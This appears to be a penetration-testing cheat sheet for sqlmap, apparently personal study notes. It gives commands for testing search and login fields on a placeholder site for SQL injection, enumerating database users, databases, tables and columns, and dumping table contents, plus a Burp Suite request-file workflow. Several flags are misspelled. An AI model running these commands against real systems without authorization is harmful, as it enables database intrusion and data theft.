# SQLMap

## SQLi fields type

<pre class="language-bash" data-title="Test Search Field" data-overflow="wrap"><code class="lang-bash"># sql help
sqlmap --help

# get banner from vuln param - GET request
sqlmap -u 'http://gigio.com/search.php?search=n' -p search --technique=U --banner -v3 --fresh-queries
# -u: possible vulnerable url
# -p: specific vulnerable param
# --techinque: specific the techinque (U = UNION)
# --banner: show a database banner
# -v: verbouse (level 0-6)
<strong># --fresh-queries: ignore query results stored in session file
</strong><strong>
</strong><strong># get banner from vuln param - POST request
</strong><strong>sqlmap -u 'http://gigio.com/search.php' -data 'search=n' -p search --technique=U --banner -v3 --fresh-queries
</strong><strong>
</strong><strong># get database users
</strong>sqlmap -u 'http://gigio.com/search.php?search=n' -p search --techinque=U --users
# --users: get all dbs users
# --current-user: get current user

# get databases name
sqlmap -u 'http://gigio.com/search.php?search=n' -p search --techinque=U --dbs

# get database tables
sqlmap -u 'http://gigio.com/search.php?search=n' -p search --techinque=U -D DB_NAME --tables
# -D: specific the databases

# get table columns
sqlmap -u 'http://gigio.com/search.php?search=n' -p search --techinque=U -D DB_NAME -T TABLE_NAME --columns
# -T: specific table

# dump db data
sqlmap -u 'http://gigio.com/search.php?search=n' -p search --techinque=U -D DB_NAME -T TABLE_NAME -C col1,col2,3 --dump
<strong>
</strong></code></pre>

{% code title="Test login form" %}
```bash
sqlmap -u http://gigio.com/login.php --data='user=test&pass=test' -p user --technique=B --banner
# -u: specific url
# --data: specific request params
# -p: specific param to test
# --technique: specific the technique
# --banner: get db banner

# enum the database
sqlmap -u http://gigio.com/login.php --data='user=test&pass=test' -p user --technique=B --dbs

# use the same flag of Search field sqli
```
{% endcode %}

## SQLMap with BurpSuite

We can intercept a request with Burp proxy and use the request to find sqli

1. Intercept the request in proxy tab
2. Right-click > 'Copy to file' > 'Save'

<figure><img src="../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Use file in sqlmap

```bash
sqlmap -r /PATH/TO/login.req -p user --technique=B --banner -v3
```

## SQLMap output

```
ls /usr/share/sqlmap/output/
```
